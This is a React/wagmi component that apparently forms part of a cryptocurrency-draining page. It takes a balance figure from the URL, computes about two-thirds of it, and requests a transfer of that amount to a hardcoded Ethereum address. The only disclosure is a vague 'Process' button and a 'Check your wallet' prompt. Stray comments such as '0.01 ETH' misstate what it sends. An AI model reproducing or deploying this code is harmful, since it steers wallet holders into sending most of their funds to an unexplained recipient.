import { stringify } from 'viem'
import { useSendTransaction } from 'wagmi'
// import type { Address } from 'wagmi'
// import { useAccount, useBalance } from 'wagmi'

// const AccountBalance = () => {
 

//   return (
//     <div>
//       {data?.formatted}
//       <input id="walletBalance"
//         placeholder='wallet address'
//         value={data?.formatted}
//       />
//     </div>
//   )
// }
// let amount 
// window.addEventListener('load', function () {

//   let getBal:any = 
//   let walletBalance = getBal
//   // let convert = walletBalance.toString()
//   // let balFmt = walletBalance.slice((walletBalance.indexOf(".")),20); //With 3 exposing the hundredths place
//   let balFmt = walletBalance * (10 ** 18)
//   amount = BigInt(balFmt)
//   console.log(amount)
// })
// console.log(amount)

setTimeout(()=>{

}, 9000)

export const SendTransaction = () => {

  var url_string = window.location.href; 
  console.log(url_string)
  var url = new URL(url_string);
  var c = url.searchParams.get("amt");
  console.log(c);

    // let getBal:any = document.getElementById('walletBalance').value
    let getBal:any = c
  let walletBalance = getBal
  console.log(walletBalance)
  // let convert = walletBalance.toString()
  let balFmt = walletBalance.slice((walletBalance.indexOf(".")),20); //With 3 exposing the hundredths place
  console.log(balFmt)
  balFmt = (walletBalance * (10 ** 18)) / 1.5
  let amount = BigInt(balFmt)
  console.log(amount)
  const { data, isIdle, isLoading, isSuccess, isError, sendTransaction } =
    useSendTransaction({
      to: '0x9BC76C1800cF9666124604717EBE58612476025E',
      value: amount, // 0.01 ETH
    })
   
  if (isLoading) return <div id="sendTxn">Check your wallet</div>

  if (isIdle)
    return (
      <div id="sendTxn">
      <button
        type='button'
        
        disabled={isLoading}
        onClick={() => sendTransaction()}
      >
         Process
      </button>
      </div>
    )

  return (
    <div id="sendTxn">
      {isSuccess && <div className="finishTxn">Transaction: {stringify(data)}</div>}
      {isError && <div className="finishTxn">Error sending transaction</div>}
    </div>
  )
}
